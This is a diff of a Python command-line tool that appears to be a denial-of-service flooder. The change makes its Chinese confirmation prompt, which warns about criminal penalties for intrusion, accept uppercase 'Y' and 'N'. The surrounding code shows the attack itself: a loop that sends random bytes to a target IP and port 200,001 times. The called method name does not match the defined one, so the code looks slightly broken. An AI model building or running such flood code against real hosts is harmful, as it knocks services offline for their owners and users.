@@ -71,11 +71,12 @@ class Main(cmd.Cmd):
 
 	def attack(self,chose):
 		chose = input('你真的要攻击吗\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。（确定输入y，终止输入n）')
-		if chose == 'y':
+		if chose == 'y' or chose == 'Y':
 			self.true_to_attack() # attack
-		elif chose == 'n':
+		elif chose == 'n' or chose == 'N':
 			self.exit()
-
+		
+		
 	def true_to_attack_attack(self):
 		for i in range(200001):
 			so.sendto(randbyte,(self.ip,self.port))
